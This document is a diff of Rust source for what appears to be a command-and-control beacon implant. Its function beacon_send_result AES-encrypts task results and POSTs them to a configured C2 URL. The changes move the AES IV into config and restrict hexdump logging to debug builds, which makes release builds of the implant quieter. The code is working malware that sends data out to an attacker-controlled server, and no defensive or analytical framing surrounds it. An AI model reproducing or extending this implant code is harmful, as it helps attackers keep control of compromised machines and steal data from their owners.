@@ -2,10 +2,10 @@ use std::io;
 use std::io::Read;
 use std::sync::atomic::Ordering;
 
-use byteorder::{ReadBytesExt, BE};
+use byteorder::{ReadBytesExt, BE, LE};
 
 use crate::beacon::init::Beacon;
-use crate::config::C2_POST_URL;
+use crate::config::{AES_IV, C2_POST_URL};
 use crate::util::crypt::{aes_encrypt, hmac_hash};
 use crate::util::strike;
 use crate::COUNTER;
@@ -56,11 +56,13 @@ pub fn beacon_send_result(
     ]
     .concat();
 
-    // 打印原始数据包
-    print_hexdump("raw_pkg", &raw_pkg);
-
+    // 仅在 debug 模式下打印
+    if cfg!(debug_assertions) {
+        // 打印原始数据包
+        print_hexdump("raw_pkg", &raw_pkg);
+    }
     // 初始化 IV
-    let iv = b"abcdefghijklmnop";
+    let iv = AES_IV;
 
     // AES 加密
     let raw_pkg_encrypted = aes_encrypt(&raw_pkg, &beacon.aes_key, iv).unwrap();
@@ -76,9 +78,11 @@ pub fn beacon_send_result(
     ]
     .concat();
 
-    // 打印最终的缓冲区
-    print_hexdump("buf", &buf);
-
+    // 仅在 debug 模式下打印
+    if cfg!(debug_assertions) {
+        // 打印最终的缓冲区
+        print_hexdump("buf", &buf);
+    }
     // 构建 URL 并发送 POST 请求
     let url = format!("{}{}", C2_POST_URL, beacon.id);
     strike::Strike::http_post(&url, "", "", buf)?;
